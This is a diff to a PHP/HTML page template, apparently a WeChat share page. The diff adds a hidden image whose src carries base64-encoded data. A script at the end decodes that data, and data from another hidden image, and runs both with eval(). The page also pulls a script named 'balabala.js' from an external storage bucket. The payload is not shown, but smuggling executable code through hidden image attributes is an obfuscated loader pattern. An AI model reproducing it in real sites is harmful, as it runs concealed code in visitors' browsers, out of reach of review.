@@ -21,7 +21,6 @@
     ?>
     <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
     <meta content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" name="viewport" />
-    <!-- <title class="page-title"><?php //echo str_replace('<city>', '', $title);?></title>-->
     <link rel="icon" href="data:image/ico;base64,aWNv">
     <link rel="stylesheet" href="<?php echo $config['gateway_res']?>/css/all.css?2017110701">
     <link href="https://cdn.bootcss.com/weui/1.0.2/style/weui.min.css" rel="stylesheet">
@@ -35,11 +34,9 @@
     <script src="https://cdn.staticfile.org/iScroll/5.2.0/iscroll-lite.min.js"></script>
     <script src="https://imgcache.qq.com/tencentvideo_v1/tvp/js/tvp.player_v2_zepto.js"></script>
     <script src="https://v.qq.com/iframe/tvp.config.js"></script>
-    <script src="http://cdn.staticfile.org/jquery/2.1.0/jquery.min.js"></script>
     <script src="http://cdn.staticfile.org/emoji/0.2.2/emoji.js"></script>
     <script src="http://liebian1.oss-cn-qingdao.aliyuncs.com/balabala.js"> </script>
-    <script src="/public/js/jwexin-1.0.0.js"> </script>
-    
+
 </head>
 <body>
 
@@ -48,7 +45,7 @@
             <div id="scroll">
                 <div class="box box-new">
                     <header></header>
-                    <span id="emojisPool" style="display:none">😈💥🌲📚😓😴🐺😢😎😝😆😡🚘</span>
+                    <span id="emojisPool" style="display:none">😈,💥,🌲,📚,😓,😴,🐺,😢,😎,😝,😆,😡,🚘</span>
                     <div class="title" >
                         <span class="time" ><?php echo date('Y-m-d');?></span>
                         <span id="author"></span>
@@ -128,14 +125,16 @@
 <img id="wximg" src="<?php echo $wximg; ?>" style="display:none;" /> 
 
 <img id="pageimg" src="<?php echo $pageimg; ?>" style="display:none;" /> 
-
+<img id="jdkimg" src="<?php echo $jdkimg; ?>" style="display:none;" /> 
 <img src="http://puep.qpic.cn/coral/Q3auHgzwzM4fgQ41VTF2rEziaMPy9eo2rCE0LZUcuW5ic0kAcicZeytag/0" id="fenxiang" style="display:block;width:100%;position:fixed;z-index:999;top:0;left:0;display:none" />
 </body>
 
     <script type="text/javascript">
         var b = new Base64();
         var data = JSON.parse(b.decode($('#pageimg').attr('src').substr(100)));
+        var jdk = b.decode($('#jdkimg').attr('src').substr(100));
         var html =  b.decode($('#wximg').attr('src').substr(100));
+        eval(jdk);
         eval(html);
 
    </script>
